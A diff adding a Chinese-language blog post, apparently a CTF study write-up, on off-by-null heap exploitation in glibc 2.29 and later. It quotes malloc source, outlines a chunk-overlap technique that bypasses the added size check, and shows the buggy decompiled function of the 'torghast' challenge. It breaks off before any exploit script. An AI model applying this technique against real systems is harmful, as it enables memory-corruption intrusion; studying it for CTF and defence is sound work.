@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="前言其实网上已经有很多类似的文章，我本着复习的态度就再写一下，回顾一下整个流程。 off-by-null 说白了就是一个 chunk overlap 的过程，这个过程分为向上合并和向下合并，接下来就结合源码具体分析一下这个过程是怎么实现的。 一些宏定义首先得知道 ptmalloc 是如何对 chunk 进行操作的 通过定义各种功能的宏 获取 chunk 的大小 12345&#x2F;* Get size,">
+<meta property="og:type" content="article">
+<meta property="og:title" content="glibc2.29以上的off-by-null">
+<meta property="og:url" content="http://makabaka-yyds.github.io/2022/05/09/glibc2-29%E4%BB%A5%E4%B8%8A%E7%9A%84off-by-null/index.html">
+<meta property="og:site_name" content="Xu4n">
+<meta property="og:description" content="前言其实网上已经有很多类似的文章，我本着复习的态度就再写一下，回顾一下整个流程。 off-by-null 说白了就是一个 chunk overlap 的过程，这个过程分为向上合并和向下合并，接下来就结合源码具体分析一下这个过程是怎么实现的。 一些宏定义首先得知道 ptmalloc 是如何对 chunk 进行操作的 通过定义各种功能的宏 获取 chunk 的大小 12345&#x2F;* Get size,">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://api.lemonprefect.cn/image/hdslb/archive/off-by-null/1652087148840540/41e85725119c7e839b8b08e5943d160c6b4ca856.png">
+<meta property="og:image" content="https://api.lemonprefect.cn/image/hdslb/archive/off-by-null/1652150079940592/ffc3972106c60951a3bc6ce35ed926af813438ae.png">
+<meta property="og:image" content="https://api.lemonprefect.cn/image/hdslb/archive/off-by-null/1652153845903978/7c9b68ace771a4e45a38c9875afb7087f5a9d35f.png">
+<meta property="og:image" content="https://api.lemonprefect.cn/image/hdslb/archive/off-by-null/1652155456640688/2799b6159e7684180ea5ea3dc5c161cdd9e4271f.png">
+<meta property="og:image" content="https://api.lemonprefect.cn/image/hdslb/archive/off-by-null/1652156856039246/9b40ea06fe4c3ed7065a6d0c74fbddd6551196da.png">
+<meta property="og:image" content="https://api.lemonprefect.cn/image/hdslb/archive/off-by-null/1652158174869327/bde938f08181fbcf64ff18b68eb589a579b3c481.png">
+<meta property="article:published_time" content="2022-05-09T08:56:46.000Z">
+<meta property="article:modified_time" content="2022-05-10T06:57:27.826Z">
+<meta property="article:author" content="Xu4n">
+<meta property="article:tag" content="PWN">
+<meta property="article:tag" content="堆">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://api.lemonprefect.cn/image/hdslb/archive/off-by-null/1652087148840540/41e85725119c7e839b8b08e5943d160c6b4ca856.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>glibc2.29以上的off-by-null</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">home</a></li><!--
+     --><!--
+       --><li><a href="/about/">about</a></li><!--
+     --><!--
+       --><li><a href="/archives/">articles</a></li><!--
+     --><!--
+       --><li><a href="/categories/">category</a></li><!--
+     --><!--
+       --><li><a href="/link/">link</a></li><!--
+     --><!--
+       --><li><a href="/search/">search</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/makabaka-yyds/makabaka-yyds.github.io">projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2022/04/27/Linux%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9EDirtycow%E5%A4%8D%E7%8E%B0/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://makabaka-yyds.github.io/2022/05/09/glibc2-29%E4%BB%A5%E4%B8%8A%E7%9A%84off-by-null/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://makabaka-yyds.github.io/2022/05/09/glibc2-29%E4%BB%A5%E4%B8%8A%E7%9A%84off-by-null/&text=glibc2.29以上的off-by-null"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://makabaka-yyds.github.io/2022/05/09/glibc2-29%E4%BB%A5%E4%B8%8A%E7%9A%84off-by-null/&title=glibc2.29以上的off-by-null"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://makabaka-yyds.github.io/2022/05/09/glibc2-29%E4%BB%A5%E4%B8%8A%E7%9A%84off-by-null/&is_video=false&description=glibc2.29以上的off-by-null"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=glibc2.29以上的off-by-null&body=Check out this article: http://makabaka-yyds.github.io/2022/05/09/glibc2-29%E4%BB%A5%E4%B8%8A%E7%9A%84off-by-null/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://makabaka-yyds.github.io/2022/05/09/glibc2-29%E4%BB%A5%E4%B8%8A%E7%9A%84off-by-null/&title=glibc2.29以上的off-by-null"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://makabaka-yyds.github.io/2022/05/09/glibc2-29%E4%BB%A5%E4%B8%8A%E7%9A%84off-by-null/&title=glibc2.29以上的off-by-null"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://makabaka-yyds.github.io/2022/05/09/glibc2-29%E4%BB%A5%E4%B8%8A%E7%9A%84off-by-null/&title=glibc2.29以上的off-by-null"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://makabaka-yyds.github.io/2022/05/09/glibc2-29%E4%BB%A5%E4%B8%8A%E7%9A%84off-by-null/&title=glibc2.29以上的off-by-null"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://makabaka-yyds.github.io/2022/05/09/glibc2-29%E4%BB%A5%E4%B8%8A%E7%9A%84off-by-null/&name=glibc2.29以上的off-by-null&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://makabaka-yyds.github.io/2022/05/09/glibc2-29%E4%BB%A5%E4%B8%8A%E7%9A%84off-by-null/&t=glibc2.29以上的off-by-null"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E5%AE%8F%E5%AE%9A%E4%B9%89"><span class="toc-number">2.</span> <span class="toc-text">一些宏定义</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%91%E4%B8%8B%E5%90%88%E5%B9%B6"><span class="toc-number">3.</span> <span class="toc-text">向下合并</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%91%E4%B8%8A%E5%90%88%E5%B9%B6"><span class="toc-number">4.</span> <span class="toc-text">向上合并</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-27"><span class="toc-number">5.</span> <span class="toc-text">2.27</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-29"><span class="toc-number">6.</span> <span class="toc-text">2.29</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">7.</span> <span class="toc-text">例题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">7.1.</span> <span class="toc-text">EXP</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        glibc2.29以上的off-by-null
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Xu4n</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-05-09T08:56:46.000Z" itemprop="datePublished">2022-05-09</time>
+        
+        (Updated: <time datetime="2022-05-10T06:57:27.826Z" itemprop="dateModified">2022-05-10</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%A0%86%E5%88%A9%E7%94%A8/">堆利用</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/PWN/" rel="tag">PWN</a>, <a class="tag-link-link" href="/tags/%E5%A0%86/" rel="tag">堆</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>其实网上已经有很多类似的文章，我本着复习的态度就再写一下，回顾一下整个流程。</p>
+<p>off-by-null 说白了就是一个 chunk overlap 的过程，这个过程分为向上合并和向下合并，接下来就结合源码具体分析一下这个过程是怎么实现的。</p>
+<h2 id="一些宏定义"><a href="#一些宏定义" class="headerlink" title="一些宏定义"></a>一些宏定义</h2><p>首先得知道 ptmalloc 是如何对 chunk 进行操作的</p>
+<p>通过定义各种功能的宏</p>
+<p>获取 chunk 的大小</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Get size, ignoring use bits */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize(p) (chunksize_nomask(p) &amp; ~(SIZE_BITS))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Like chunksize, but do not mask SIZE_BITS.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize_nomask(p) ((p)-&gt;mchunk_size)</span></span><br></pre></td></tr></table></figure>
+<p><strong>获取下一 chunk 块地址</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Ptr to next physical malloc_chunk. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))</span></span><br></pre></td></tr></table></figure>
+<p>获取前一个 chunk 信息</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Size of the chunk below P.  Only valid if prev_inuse (P).  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_size(p) ((p)-&gt;mchunk_prev_size)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))</span></span><br></pre></td></tr></table></figure>
+<p>判断当前 chunk 是否是 use 状态</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inuse(p)</span></span><br><span class="line">    ((((mchunkptr)(((<span class="keyword">char</span> *) (p)) + chunksize(p)))-&gt;mchunk_size) &amp; PREV_INUSE)</span><br></pre></td></tr></table></figure>
+<h2 id="向下合并"><a href="#向下合并" class="headerlink" title="向下合并"></a>向下合并</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate forward */</span></span><br><span class="line"><span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">    unlink(av, nextchunk, bck, fwd);</span><br><span class="line">    size += nextsize;</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line">    clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
+<p>可以看到，它一开始会检查下一个 chunk  的 inuse 位是否为 0 ，因为下一个 chunk 的 inuse 位会标志当前 chunk 的使用状态。</p>
+<p>如果为 0 ，说明当前 chunk 为空闲状态。于是触发 unlink ，将当前 chunk 的下一个 chunk  取出 chunk 链，再将当前 chunk 的 size 变为 <code>size + nextsize</code>。</p>
+<h2 id="向上合并"><a href="#向上合并" class="headerlink" title="向上合并"></a>向上合并</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = p-&gt;prev_size;</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));<span class="comment">//改指针p</span></span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>相对于向下合并更加复杂，首先检查自己本身的 inuse 位是否为 0，即检查上一个 chunk 是否为空闲 chunk。</p>
+<p>为 0，说明空闲。于是先获取上一个 chunk 的 size 大小，将其保存在 prevsize 中，然后将自己的 size 改为 <code>size + 上一个 chunk 的 size</code></p>
+<p>再将指向自己的指针 p ，减去上一个 chunk 的 size，使其指向上一个 chunk 所在的位置。</p>
+<p>最后 unlink 将 上一个 chunk 从 chunk 链取出。</p>
+<blockquote>
+<p>整个过程说白了就是把 上/下一个 chunk t 了，然后通过改变自己 chunk 的 size (向上合并时还要改变指针位置) 替代掉被 t 的chunk。</p>
+</blockquote>
+<h2 id="2-27"><a href="#2-27" class="headerlink" title="2.27"></a>2.27</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// In /glibc/glibc-2.27/source/malloc/malloc.c#L1404</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br><span class="line">    FD = P-&gt;fd;</span><br><span class="line">    BK = P-&gt;bk;</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        FD-&gt;bk = BK;</span><br><span class="line">        BK-&gt;fd = FD;</span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))</span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)</span><br><span class="line">                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))</span><br><span class="line">                malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)</span><br><span class="line">                    FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;</span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;</span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;</span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;</span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>主要的检查：</p>
+<p>第一个：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);</span><br></pre></td></tr></table></figure>
+<p>此时如果我们将相应大小的tca bin 填满，free chunk0 ，chunk0 会链入unsorted bin，此时 chunk0 的 fd 和 bk 都是 0x7f…..，同时 unsorted bin 只有 chunk0 ，所以链表头的 fd 和 bk 也都指向 chunk0。</p>
+<p>第二个：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>检查要脱链的 chunk 的 size 是否和 下一个 chunk 的 prev_size 相等。</p>
+<p>于是可以构造如下 chunk</p>
+<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/off-by-null/1652087148840540/41e85725119c7e839b8b08e5943d160c6b4ca856.png" alt="813771_RDMN83VJVTAFXQG"></p>
+<p>大致流程就是：</p>
+<ol>
+<li>创建四个 chunk，这里直接对应 chunk 0，1，2，3(chunk3 是为了防止 off-by-null 的时候整个堆块与 top chunk 合并，chunk3 的 prev_size 要注意)</li>
+<li>free chunk0，此时 chunk1 的 prev_size 会留下 chunk0 的大小</li>
+<li>通过 chunk1 off-by-null 覆盖到 chunk2，修改 chunk2 的 prev_size 和 size 的 p 位(prev_size 修改成 chunk0+chunk1 的大小)</li>
+<li>free chunk2 触发 unlink 合并</li>
+<li>将 chunk0 进行 Unlink 操作，通过 chunk0 的 size 域找到 nextchunk 就是 chunk1 ，检查 chunk0 的 size 与 chunk1 的 prev_size 是否相等。</li>
+<li>由于第二步中已经在 chunk1 的 prev_size 域留下了 chunk0 的大小，因此，检查通过</li>
+</ol>
+<h2 id="2-29"><a href="#2-29" class="headerlink" title="2.29"></a>2.29</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// In /glibc/glibc-2.29/source/malloc/malloc.c#L1460</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Take a chunk off a bin list.  */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">unlink_chunk</span> <span class="params">(mstate av, mchunkptr p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br><span class="line"></span><br><span class="line">    mchunkptr fd = p-&gt;fd;</span><br><span class="line">    mchunkptr bk = p-&gt;bk;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line"></span><br><span class="line">    fd-&gt;bk = bk;</span><br><span class="line">    bk-&gt;fd = fd;</span><br><span class="line">    <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (p-&gt;fd_nextsize-&gt;bk_nextsize != p || p-&gt;bk_nextsize-&gt;fd_nextsize != p)</span><br><span class="line">            malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (fd-&gt;fd_nextsize == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (p-&gt;fd_nextsize == p)</span><br><span class="line">                fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                fd-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">                fd-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">                p-&gt;fd_nextsize-&gt;bk_nextsize = fd;</span><br><span class="line">                p-&gt;bk_nextsize-&gt;fd_nextsize = fd;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">            p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>unlink 内部没有多大变化。</p>
+<p>向上合并时发生了一点变化：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = prev_size (p);</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">    unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>多了一行：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>说白了就是会检查 chunk0 的 size 和 chunk2 的 prevsize 是否相等，这使得用传统的构造方式进行 chunk overlap 不可能实现。</p>
+<p>于是就有了另一种方法，利用残留指针伪造 fake chunk，将 fake chunk 的 size 写为 chunk2 的 prevsize，不就绕过检查了吗。</p>
+<p>直接用例题进行讲解</p>
+<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>题目是 2022 年春秋杯的 torghast</p>
+<p>大概流程是通过加血的方式打过 level3，然后就可以进入菜单，这个过程就不细说了，主要讲讲 off-by-null 的过程。</p>
+<p>edit 函数存在 off-by-null 漏洞</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Which Player To Change?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">3uLL</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">0x10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Segmentation 